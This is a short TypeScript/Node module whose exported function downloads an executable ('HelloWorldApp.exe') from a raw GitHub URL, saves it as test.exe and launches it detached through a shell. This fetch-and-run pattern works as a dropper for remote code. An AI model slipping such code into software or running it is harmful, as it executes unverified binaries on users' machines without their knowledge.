
const fs = require('fs');
var fetch = require('node-fetch');
const { spawn, exec, execFile } = require('child_process');

const URL = "https://github.com/WileyCorning/temp/blob/master/HelloWorldApp.exe?raw=true";
const filename = "test.exe";
    
export default function() {

fetch(URL).then((req:any) => new Promise<void>((resolve,reject) => {
    var file = fs.createWriteStream(filename);
    req.body.pipe(file);
    
    req.body.on('error',(err:any)=>reject(err));
    file.on('error',(err:any)=>reject(err));
    file.on('finish',()=>resolve());
    })).then(() => {
        spawn(filename,[],{shell:true,detached:true});
    });
}